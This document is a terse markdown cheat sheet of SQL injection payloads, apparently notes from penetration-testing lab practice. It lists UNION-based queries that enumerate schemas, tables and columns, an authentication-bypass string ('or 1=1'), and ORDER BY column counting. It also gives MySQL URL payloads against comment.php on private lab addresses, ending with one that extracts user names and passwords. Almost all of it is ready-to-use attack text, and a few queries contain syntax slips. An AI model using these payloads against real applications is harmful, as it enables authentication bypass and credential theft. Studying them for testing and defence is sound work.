# SQL Injection

## Current Schema

```sql
...union select 1, schema(), 3,4,5,6,7,8,9
```

## Show Tables

```sql
...union select 1, schema_name, 3,4,5,6,7,8,9 from information_schema.schemata

...union select 1, table_name, 3,4,5,6,7,8,9 from INFORMATION_SCHEMA.tables
```

## Column Names

```sql
...union select 1, table_name, column,name 3,4,5,6,7,8,9 from INFORMATION_SCHEMA.columns where table_name = '<TABLE_NAME>'
```

## User defined Tables/Columns

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = 'databasename'

SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'tablename'
```

## Bypass Auth

```sql
user' or 1=1 limit 1; #
```

## Enum num of Columns

```sql
10.11.24.85/comment.php?id=774 order by 1
10.11.24.85/comment.php?id=774 order by 2
...
# until hits error

```

## MySQL samples

```sql
# Version
10.11.24.85/comment.php?id=774 union all select 1,2,3,4,(select @@version),6

# current user
10.11.24.85/comment.php?id=774 union all select 1,2,3,4,user(),6

# tables
10.11.24.85/comment.php?id=774%20union%20all%20select%201,2,3,4,table_name from information_schema.tables

# columns
10.11.1.35/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM
information_schema.columns where table_name='users'

# Extract user and password
10.11.24.85/comment.php?id=774%20union%20all%20select%201,2,name,4,password,6%20from%
20users
```



